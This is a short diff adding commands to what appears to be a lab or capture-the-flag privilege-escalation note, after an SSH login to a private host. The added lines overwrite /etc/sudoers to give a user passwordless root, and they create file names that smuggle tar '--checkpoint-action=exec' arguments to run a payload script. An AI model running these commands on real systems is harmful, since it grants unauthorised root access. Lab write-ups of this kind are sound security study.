@@ -394,6 +394,10 @@ ssh james@192.168.231.10 -i james_ecdsa
 
 # exploit
 sudo -l
+echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+echo "" > '--checkpoint=1'  
+echo "" > '--checkpoint-action=exec=sh payload.sh'
+
 
 ```
 
